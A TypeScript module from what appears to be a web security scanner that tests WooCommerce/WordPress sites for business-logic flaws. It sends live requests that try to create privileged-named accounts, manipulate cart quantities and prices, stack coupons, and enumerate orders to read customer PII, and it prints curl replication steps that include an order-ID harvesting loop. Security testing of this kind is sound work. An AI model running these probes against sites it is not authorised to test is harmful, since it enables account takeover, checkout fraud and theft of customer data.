import type { ModuleResult, ScanState } from '../types.js';
import { fetchURL, finding, moduleResult, normalizeTarget , parallelProbe } from '../utils.js';

const MODULE_NAME = 'Business Logic Flaws';

const WC_BASE = '/wp-json/wc/v3';
const WC_STORE = '/wp-json/wc/store/v1';

async function wcDetected(base: string): Promise<boolean> {
  const r = await fetchURL(`${base}/wp-json/wc/v3/products`, { timeoutMs: 8000 });
  return r !== null && [200, 401, 403].includes(r.status);
}

export async function run(target: string, _state?: ScanState): Promise<ModuleResult> {
  const start = Date.now();
  target = normalizeTarget(target);
  const findings: ReturnType<typeof finding>[] = [];
  const errors: string[] = [];

  const wcPresent = await wcDetected(target);

  // Registration bypass checks
  try {
    const regUrl = `${target}/wp-login.php?action=register`;
    const r = await fetchURL(regUrl);
    if (r) {
      const regBody = await r.text();
      if (regBody.toLowerCase().includes('user_login')) {
        const restUrl = `${target}/wp-json/wp/v2/users`;
        for (const uname of ['admin', 'administrator', 'root']) {
          try {
            const r2 = await fetchURL(restUrl, {
              method: 'POST',
              body: JSON.stringify({ username: uname, email: `${uname}@probe.invalid`, password: 'Pr0be!2024!' }),
              headers: { 'Content-Type': 'application/json' },
            });
            if (r2?.status === 201) {
              findings.push(finding(
                'BUSINESS_LOGIC_ACCOUNT_TAKEOVER',
                'CRITICAL',
                restUrl,
                `Business logic: Created user with privileged username '${uname}' via REST API without auth`,
                {
                  replication_steps: [
                    `curl -s -X POST '${restUrl}' -H 'Content-Type: application/json' -d '{"username":"${uname}","email":"${uname}@attacker.com","password":"Attacker1!"}'`,
                    `Observe HTTP 201 — '${uname}' account created.`,
                    'Log in with the new account to confirm unauthorized access.',
                  ],
                  evidence: JSON.stringify({ attempted_username: uname, http_status: 201 }),
                },
              ));
            }
          } catch (e) {
            errors.push(String(e));
          }
        }
      }
    }
  } catch (e) {
    errors.push(String(e));
  }

  if (wcPresent) {
    // Negative price / qty manipulation
    try {
      const cartUrl = `${target}${WC_STORE}/cart/add-item`;
      const rProds = await fetchURL(`${target}${WC_STORE}/products?per_page=1`);
      if (rProds?.status === 200) {
        let productId: unknown;
        try {
          const prods = await rProds.json() as Record<string, unknown>[];
          if (prods.length > 0) productId = prods[0].id;
        } catch { /* ignore */ }

        if (productId !== undefined) {
          for (const qty of [-1, 0, 99999]) {
            try {
              const r = await fetchURL(cartUrl, {
                method: 'POST',
                body: JSON.stringify({ id: productId, quantity: qty }),
                headers: {
                  'Content-Type': 'application/json',
                  'X-WC-Store-API-Nonce': 'invalid_nonce_probe',
                },
              });
              if (r && [200, 201].includes(r.status)) {
                let data: Record<string, unknown> = {};
                try { data = await r.json() as Record<string, unknown>; } catch { /* ignore */ }
                const code = String(data.code ?? '');
                if (code === 'woocommerce_rest_cart_invalid_key' || code === 'woocommerce_cart_invalid_key') continue;
                findings.push(finding(
                  'BUSINESS_LOGIC_NEGATIVE_QTY',
                  'HIGH',
                  cartUrl,
                  `Business logic: Cart accepts quantity=${qty} for product ${productId} — HTTP ${r.status}`,
                  {
                    replication_steps: [
                      `curl -s -X POST '${cartUrl}' -H 'Content-Type: application/json' -d '{"id":${productId},"quantity":${qty}}'`,
                      `Observe HTTP ${r.status} — server accepted invalid quantity.`,
                      'Test negative quantity to obtain negative-value cart total (free items).',
                    ],
                    evidence: JSON.stringify({ product_id: productId, quantity: qty }),
                  },
                ));
                break;
              }
            } catch (e) {
              errors.push(String(e));
            }
          }
        }
      }
    } catch (e) {
      errors.push(String(e));
    }

    // Coupon stacking abuse
    try {
      const cartCouponUrl = `${target}${WC_STORE}/cart/apply-coupon`;
      const couponCode = 'bfla_dup_test';
      await parallelProbe(Array.from({ length: 2 }, (_, i) => i), async (attempt) => {
        const r = await fetchURL(cartCouponUrl, {
          method: 'POST',
          body: JSON.stringify({ code: couponCode }),
          headers: { 'Content-Type': 'application/json', 'X-WC-Store-API-Nonce': 'invalid' },
        });
        if (!r) return;
        if (r.status === 200 && attempt === 1) {
          findings.push(finding(
            'BUSINESS_LOGIC_COUPON_STACK',
            'MEDIUM',
            cartCouponUrl,
            'Business logic: same coupon accepted twice in the same cart',
            {
              replication_steps: [
                `curl -s -X POST '${cartCouponUrl}' -H 'Content-Type: application/json' -d '{"code":"${couponCode}"}' (twice)`,
                'Observe HTTP 200 on second application — duplicate discount applied.',
                'Chain multiple unique coupon codes to reach 100% discount.',
              ],
              evidence: JSON.stringify({ coupon_code: couponCode }),
            },
          ));
        }
      });
    } catch (e) {
      errors.push(String(e));
    }

    // Client-side price manipulation
    try {
      const checkoutUrl = `${target}${WC_STORE}/checkout`;
      const rProds = await fetchURL(`${target}${WC_STORE}/products?per_page=1`);
      if (rProds?.status === 200) {
        let productId: unknown;
        let originalPrice: unknown = 'unknown';
        try {
          const prods = await rProds.json() as Record<string, unknown>[];
          if (prods.length > 0) {
            productId = prods[0].id;
            originalPrice = (prods[0].prices as Record<string, unknown>)?.price ?? 'unknown';
          }
        } catch { /* ignore */ }

        if (productId !== undefined) {
          const payload = {
            billing_address: {
              first_name: 'BFLA', last_name: 'Test',
              address_1: '1 Test St', city: 'Testville',
              state: 'CA', postcode: '90210', country: 'US',
              email: 'bfla@probe.invalid',
            },
            payment_method: 'cod',
            line_items: [{ id: productId, quantity: 1, price: '0.01' }],
          };
          const r = await fetchURL(checkoutUrl, {
            method: 'POST',
            body: JSON.stringify(payload),
            headers: { 'Content-Type': 'application/json', 'X-WC-Store-API-Nonce': 'invalid' },
          });
          if (r && [200, 201].includes(r.status)) {
            let data: Record<string, unknown> = {};
            try { data = await r.json() as Record<string, unknown>; } catch { /* ignore */ }
            const orderId = data.order_id ?? data.id;
            if (orderId) {
              findings.push(finding(
                'BUSINESS_LOGIC_PRICE_MANIPULATION',
                'CRITICAL',
                checkoutUrl,
                `Business logic: Order ${orderId} created with client-supplied price (original: ${originalPrice}) — price manipulation possible`,
                {
                  replication_steps: [
                    `curl -s -X POST '${checkoutUrl}' -H 'Content-Type: application/json' -d '{..."price":"0.01"...}'`,
                    `Observe order ${orderId} created — server trusted client-provided price.`,
                    'Verify order total in WP admin and compare to real product price.',
                  ],
                  evidence: JSON.stringify({ product_id: productId, submitted_price: '0.01', original_price: originalPrice, order_id: orderId }),
                },
              ));
            }
          }
        }
      }
    } catch (e) {
      errors.push(String(e));
    }

    // Order IDOR via ID enumeration
    try {
      await parallelProbe(Array.from({ length: 5 }, (_, i) => i + 1), async (orderId) => {
        const url = `${target}${WC_BASE}/orders/${orderId}`;
        try {
          const r = await fetchURL(url);
          if (r?.status === 200) {
            let data: Record<string, unknown> = {};
            try { data = await r.json() as Record<string, unknown>; } catch { /* ignore */ }
            if (data.billing) {
              const email = String((data.billing as Record<string, unknown>).email ?? '');
              findings.push(finding(
                'BUSINESS_LOGIC_ORDER_IDOR',
                'HIGH',
                url,
                `Business logic IDOR: Order #${orderId} details accessible without auth${email ? ` (customer: ${email})` : ''}`,
                {
                  replication_steps: [
                    `curl -s '${url}' | python3 -m json.tool`,
                    'Observe full order including billing/shipping PII without authentication.',
                    `Iterate order IDs from 1 to N: for i in $(seq 1 100); do curl -s '${target}${WC_BASE}/orders/'$i; done`,
                  ],
                  evidence: JSON.stringify({ order_id: orderId, customer_email: email }),
                },
              ));
            }
          }
        } catch { /* ignore */ }
      });
    } catch (e) {
      errors.push(String(e));
    }
  }

  return moduleResult(MODULE_NAME, target, findings, errors, start);
}
